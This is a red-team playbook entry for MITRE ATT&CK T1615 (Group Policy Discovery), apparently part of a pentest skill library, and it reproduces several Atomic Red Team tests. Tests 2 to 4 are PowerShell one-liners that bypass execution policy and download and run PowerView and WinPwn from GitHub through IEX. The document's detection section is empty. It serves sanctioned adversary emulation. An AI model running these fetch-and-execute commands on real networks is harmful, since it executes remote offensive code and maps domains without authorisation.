---
name: "T1615_group-policy-discovery"
description: "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that ca..."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1615
  - discovery
  - windows
technique_id: "T1615"
tactic: "discovery"
all_tactics:
  - discovery
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1615"
tech_stack:
  - windows
cwe_ids:
  - CWE-200
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1615 Group Policy Discovery

## High-Level Description

Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.

Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings. Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain or Tenant Policy Modification) for their benefit.

## Kill Chain Phase

- Discovery (TA0007)

**Platforms:** Windows

## What to Check

- [ ] Identify if Group Policy Discovery technique is applicable to target environment
- [ ] Check Windows systems for indicators of Group Policy Discovery
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Display group policy information via gpresult

Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer
The /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult
https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/
Turla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf

**Supported Platforms:** windows

```cmd
gpresult /z
```

### Atomic Test 2: Get-DomainGPO to display group policy information via PowerView

Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
```

### Atomic Test 3: WinPwn - GPOAudit

Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPOAudit -noninteractive -consoleoutput
```

### Atomic Test 4: WinPwn - GPORemoteAccessPolicy

Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
GPORemoteAccessPolicy -consoleoutput -noninteractive
```

### Atomic Test 5: MSFT Get-GPO Cmdlet

The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}
```

**Dependencies:**
- Add Rsat.ActiveDirectory.DS
- Add Rsat.GroupPolicy.Management.Tools ###Two RSAT Modules needed for this to work on Win10, WinServer 2019 works by default. This will take a long time (almost 2 minutes) to install RSAT Manually###.


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Group Policy Discovery by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1615 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Detection strategy for Group Policy Discovery on Windows


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Group Policy Discovery technique applicable | High | Discovery |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [ADSecurity GPO Persistence 2016](https://adsecurity.org/?p=2716)
- [Microsoft gpresult](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult)
- [Github PowerShell Empire](https://github.com/PowerShellEmpire/Empire)
- [TechNet Group Policy Basics](https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/)
- [Atomic Red Team - T1615](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1615)
- [MITRE ATT&CK - T1615](https://attack.mitre.org/techniques/T1615)
